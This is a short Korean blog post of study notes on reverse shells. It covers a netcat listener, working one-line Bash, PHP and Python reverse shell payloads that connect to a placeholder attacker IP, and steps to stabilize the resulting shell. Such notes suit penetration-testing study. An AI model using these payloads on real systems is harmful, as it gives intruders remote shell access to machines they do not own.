---
layout: post
title: "리버스 쉘 (Reverse Shell) 공부"
date: 2025-09-20 17:00:00 +0900
categories: [시스템 해킹]
---

### 1. 개요

리버스 쉘(Reverse Shell)은 공격 대상 서버가 공격자 PC로 직접 쉘을 연결하도록 만드는 공격 기법이다. 방화벽이 외부에서 내부로 들어오는 연결은 차단하지만 내부에서 외부로 나가는 연결은 허용하는 경우가 많다는 점을 이용한다.

---

### 2. 1단계: 리스너 설정

가장 먼저 공격자 PC에서 대상 서버로부터의 연결을 받을 준비를 해야 한다. `netcat`을 이용해 특정 포트를 열고 연결을 기다리는 리스너를 실행한다.
```bash
# 4444번 포트에서 연결을 대기하며 상세 정보를 출력
nc -lvnp 4444
```
*   `-l`: 리스닝 모드
*   `-v`: 상세 정보 출력
*   `-n`: DNS 조회 생략
*   `-p`: 포트 지정

---

### 3. 2단계: 페이로드 실행

대상 서버의 환경에 맞는 페이로드를 실행하여 공격자 PC로 연결을 시도한다. `revshells.com`과 같은 도구를 사용하면 원하는 환경의 페이로드를 쉽게 생성할 수 있다.

*   **Bash:** `bash -i >& /dev/tcp/[Attacker IP]/4444 0>&1`
*   **PHP:** `php -r '$sock=fsockopen("[Attacker IP]",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`
*   **Python:** `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("[Attacker IP]",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'`

---

### 4. 3단계: 쉘 안정화 (Stabilization)

처음 획득한 쉘은 자동 완성이나 `Ctrl+C`가 동작하지 않는 불안정한 쉘(Dumb Shell)이다. 이를 상호작용이 가능한 완전한 TTY 쉘로 업그레이드하는 과정이 필요하다.

[여기에 쉘 안정화 전/후 비교 이미지 삽입]

1.  **TTY 쉘 생성:**
    ```bash
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    ```
2.  **터미널 제어권 확보:**
    ```bash
    # (Ctrl+Z 입력) -> 쉘을 백그라운드로 보냄
    stty raw -echo; fg
    # (Enter 두 번 입력) -> 다시 포어그라운드로 가져옴
    ```
3.  **환경 변수 설정:**
    ```bash
    export TERM=xterm
    export SHELL=bash
    ```

<hr class="short-rule">
